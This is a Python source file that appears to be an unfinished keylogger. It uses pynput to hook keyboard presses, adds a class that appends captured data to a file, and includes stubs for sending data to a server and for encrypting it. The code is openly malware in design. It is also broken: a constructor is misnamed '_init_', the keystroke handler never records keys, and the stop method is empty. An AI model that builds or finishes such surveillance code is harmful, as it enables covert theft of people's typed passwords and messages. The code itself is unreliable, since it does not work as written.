from  abc import ABC, abstractmethod
from pynput.keyboard import Listener, Key, KeyCode





class Logger(ABC):

    @abstractmethod
    def write(self, data):
        pass


class KeyLoggerService: #Responsible for collecting keystrokes in real time

    def __init__(self):
        self.my_dict =  dict()

    def get_key_strokes(self,key):

        if len(self.my_dict)  ==  0:
            self.my_dict =  dict()
        else:
            # key = special_key_conversions(key)
            self.my_dict["jj"] = key

    def special_key_conversions(self,key):
        pass








class FileWriter(Logger):

    def _init_(self,filename: str):
        self.filename =  filename

    def write(self, data):
        with open(self.filename, "a")  as file:
            file.write(data + "\n")

class NetworkWriter:  #Need to send data to the server
    def write(self, data):
        pass

class Encryptor: #Responsible for encryption
    pass

class KeyLoggerManager:
    def __init__(self):
        self.a = None

    def start_listening(self):
        listener = Listener(on_press = KeyLoggerService().get_key_strokes )
        listener.start()

    def stop_listening(self):
        pass